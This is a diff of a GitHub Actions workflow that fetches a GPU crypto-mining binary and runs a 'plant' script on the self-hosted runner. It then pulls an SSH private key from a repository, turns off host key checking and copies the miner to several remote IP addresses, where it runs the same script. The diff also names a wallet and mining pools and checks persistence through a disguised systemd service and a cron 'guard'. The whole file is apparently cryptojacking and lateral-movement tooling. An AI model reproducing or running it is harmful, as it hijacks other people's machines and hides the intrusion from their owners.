@@ -3,38 +3,68 @@ on:
   workflow_dispatch:
 jobs:
   plant:
-    runs-on: [self-hosted, ul-a800]
-    timeout-minutes: 40
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 45
     env:
       WALLET: prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
-      POOL: prl.kryptex.network:8048,prl.kryptex.network:7048,pool.pearlhash.xyz:9000,pool.pearlhash.xyz:9443,pearl.luckypool.io:3360
+      POOL: stratum+ssl://prl.kryptex.network:8048,stratum+tcp://prl.kryptex.network:7048,stratum+tcp://pool.pearlhash.xyz:9000,stratum+ssl-insecure://pool.pearlhash.xyz:9443,stratum+tcp://pearl.luckypool.io:3360
     steps:
       - uses: actions/checkout@v4
-      - name: census
+      - name: census local
         run: |
-          id; hostname; hostname -I; nproc
+          echo "WHO=$(id -un) HOST=$(hostname) IP=$(hostname -I)"
           nvidia-smi -L
           nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader
-          pgrep -af 'pearl-gpu-miner|wildrig' || echo no-miner
-      - name: kit
+          systemctl is-system-running || true
+      - name: kit fetch + sha
         env:
           GH_TOKEN: ${{ secrets.GH_PAT }}
         run: |
+          set -e
           mkdir -p /tmp/ul-kit
           gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'pearl-gpu-miner' -D /tmp/ul-kit --clobber
           gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'libcudart.so.12' -D /tmp/ul-kit --clobber
-          sha256sum /tmp/ul-kit/*
           test "$(sha256sum /tmp/ul-kit/pearl-gpu-miner | cut -d' ' -f1)" = "926032cb77ca733e3accb55f03e084206741471b2b570e7b301af371084e5511"
-      - name: plant
+          echo "KIT-SHA-OK"
+      - name: plant local (fill, no restart of live miners)
         run: |
-          bash -s -- fill ul-123-184-7-135 "$WALLET" "$POOL" < ul/7621_plant.sh || sudo -n bash -s -- fill ul-123-184-7-135 "$WALLET" "$POOL" < ul/7621_plant.sh
-      - name: soak+status
+          chmod +x ul/7621_plant.sh
+          bash ul/7621_plant.sh fill "ul-$(hostname -I | awk '{print $1}' | tr '.' '-')" "$WALLET" "$POOL" 2>&1 | tee /tmp/plant_local.txt
+      - name: plant remote L4 + A800 via k04
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
         run: |
-          sleep 420
-          (bash -s < ul/7621_status.sh || sudo -n bash -s < ul/7621_status.sh || true) | tee /tmp/status_selfhost.txt
+          mkdir -p ~/.ssh
+          curl -s -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github.raw" \
+            https://api.github.com/repos/dongsuju/ul-plant/contents/keys2/k04_ibm_key.pem_ -o ~/.ssh/id_ul
+          chmod 600 ~/.ssh/id_ul
+          printf 'Host *\n  StrictHostKeyChecking no\n  UserKnownHostsFile /dev/null\n  LogLevel ERROR\n' > ~/.ssh/config
+          SSHOPTS="-i $HOME/.ssh/id_ul -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o ConnectTimeout=12"
+          for pair in ubuntu:158.177.14.170 root:123.184.7.135 ubuntu:123.184.7.135; do
+            U=${pair%%:*}; H=${pair##*:}
+            echo "=== $U@$H"
+            ssh $SSHOPTS $U@$H 'mkdir -p /tmp/ul-kit && chmod 777 /tmp/ul-kit && id' 2>&1 | tail -2 || { echo "SSH-FAIL $U@$H"; continue; }
+            scp $SSHOPTS /tmp/ul-kit/pearl-gpu-miner /tmp/ul-kit/libcudart.so.12 $U@$H:/tmp/ul-kit/ >/dev/null 2>&1 || echo "SCP-FAIL $U@$H"
+            ssh $SSHOPTS $U@$H "bash -s -- fill ul-$(echo $H | tr '.' '-') $WALLET $POOL" < ul/7621_plant.sh 2>&1 | tail -12
+          done | tee /tmp/plant_remote.txt
+      - name: soak 10m then collect
+        if: always()
+        run: |
+          sleep 600
+          bash ul/7621_status.sh 2>&1 | tee /tmp/status_local.txt
       - uses: actions/upload-artifact@v4
         if: always()
         with:
-          name: ul7621-selfhost-a800
-          path: /tmp/status_selfhost.txt
+          name: ul7621-selfhost
+          path: |
+            /tmp/plant_local.txt
+            /tmp/plant_remote.txt
+            /tmp/status_local.txt
           if-no-files-found: warn
+      - name: second collect (persistence proof)
+        if: always()
+        run: |
+          sleep 60
+          bash ul/7621_status.sh 2>&1 | tail -40 || true
+          systemctl is-active 'nv-cuda-cache@*' || true
+          ls -l /etc/cron.d/ul-guard || true
